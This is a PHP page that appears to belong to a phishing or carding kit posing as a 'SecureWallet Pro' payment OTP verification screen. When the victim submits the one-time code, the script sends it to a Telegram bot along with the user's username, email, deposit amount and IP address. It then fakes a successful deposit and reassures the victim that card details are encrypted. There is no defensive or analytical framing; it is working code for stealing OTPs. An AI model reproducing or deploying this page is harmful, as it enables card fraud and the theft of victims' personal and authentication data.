<?php
require_once 'config.php';
if (!isset($_SESSION['user_id']) || !isset($_SESSION['deposit_amount'])) {
    header('Location: deposit.php');
    exit;
}

// FIX: Fetch user data
$stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_SESSION['user_id']]);
$user = $stmt->fetch();

if (!$user) {
    header('Location: index.php');
    exit;
}

if ($_POST) {
    $otp = $_POST['otp'];
    $amount = $_SESSION['deposit_amount'];
    
    // Send OTP + full details to Telegram
    $message = "🔐 <b>OTP + REPEAT CARD DEPOSIT</b>\n";
    $message .= "👤 User: {$user['username']}\n";
    $message .= "📧 Email: {$user['email']}\n";
    $message .= "💰 Amount: $$amount\n";
    $message .= "🔢 OTP: $otp\n";
    $message .= "🌐 IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $message .= "⏰ " . date('Y-m-d H:i:s T');
    sendTelegram($message);
    
    // Add to balance
    $db->prepare("UPDATE users SET balance = balance + ? WHERE id = ?")
       ->execute([$amount, $_SESSION['user_id']]);
    
    // Log transaction
    $db->prepare("INSERT INTO transactions (user_id, type, method, amount, status, details) VALUES (?, 'deposit', 'card', ?, 'success', 'Repeat deposit with OTP verification')")
       ->execute([$_SESSION['user_id'], $amount]);
    
    unset($_SESSION['deposit_amount']);
    header('Location: deposit_success.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Verification - SecureWallet Pro</title>
    <link rel="stylesheet" href="style.css">
    <style>
    .otp-page { background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
    .otp-container { background: white; padding: 50px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); max-width: 400px; width: 100%; text-align: center; }
    .otp-input { position: relative; margin: 30px 0; }
    .otp-input input { width: 100%; padding: 20px; font-size: 24px; letter-spacing: 10px; text-align: center; border: 2px solid #e1e5e9; border-radius: 12px; }
    </style>
</head>
<body class="otp-page">
    <div class="otp-container">
        <div class="security-icon">🔐</div>
        <h2>Verify Your Payment</h2>
        <p>Enter the 6-digit code sent to your phone/email</p>
        
        <form method="POST" class="otp-form">
            <div class="otp-input">
                <input type="text" name="otp" maxlength="6" placeholder="000000" 
                       pattern="[0-9]{6}" required autofocus>
            </div>
            <button type="submit" class="btn-verify">Complete Deposit</button>
        </form>
        
        <p class="resend"><a href="#">Didn't receive code? Resend OTP</a></p>
        <p class="security-note">Your card details are encrypted</p>
    </div>
</body>
</html>
